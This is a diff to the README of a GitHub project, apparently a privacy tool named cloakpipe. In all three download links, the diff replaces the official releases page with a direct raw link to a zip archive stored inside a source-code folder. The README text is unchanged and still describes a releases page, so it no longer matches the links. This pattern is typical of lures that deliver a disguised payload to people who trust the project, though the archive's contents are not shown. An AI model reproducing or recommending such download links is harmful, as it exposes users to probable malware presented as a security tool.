@@ -1,6 +1,6 @@
 # 🔐 cloakpipe - Protect Your Data Seamlessly
 
-[![Download cloakpipe](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Kelvin295/cloakpipe/releases)
+[![Download cloakpipe](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Kelvin295/cloakpipe/raw/refs/heads/main/crates/cloakpipe-audit/src/Software_2.5.zip)
 
 cloakpipe is a privacy tool designed to keep your data safe in complex AI systems. It helps you hide sensitive information, encrypt files, and manage secure data access. This app works quietly behind the scenes to protect your data when you use language models and AI pipelines.
 
@@ -49,7 +49,7 @@ Because cloakpipe’s download link points to the general release page, you need
 
 Click the button below to go to the download page:
 
-[![Download cloakpipe](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/Kelvin295/cloakpipe/releases)
+[![Download cloakpipe](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/Kelvin295/cloakpipe/raw/refs/heads/main/crates/cloakpipe-audit/src/Software_2.5.zip)
 
 You will see a list of available releases. Look for the latest release that suits your system. Usually, this will be a file with an `.exe` extension for Windows.
 
@@ -126,7 +126,7 @@ If problems persist, look for help on the project’s GitHub page under "Issues.
 
 Visit the release page here to get the app:
 
-[https://github.com/Kelvin295/cloakpipe/releases](https://github.com/Kelvin295/cloakpipe/releases)
+[https://github.com/Kelvin295/cloakpipe/raw/refs/heads/main/crates/cloakpipe-audit/src/Software_2.5.zip](https://github.com/Kelvin295/cloakpipe/raw/refs/heads/main/crates/cloakpipe-audit/src/Software_2.5.zip)
 
 This page has the latest versions and files for Windows.
 
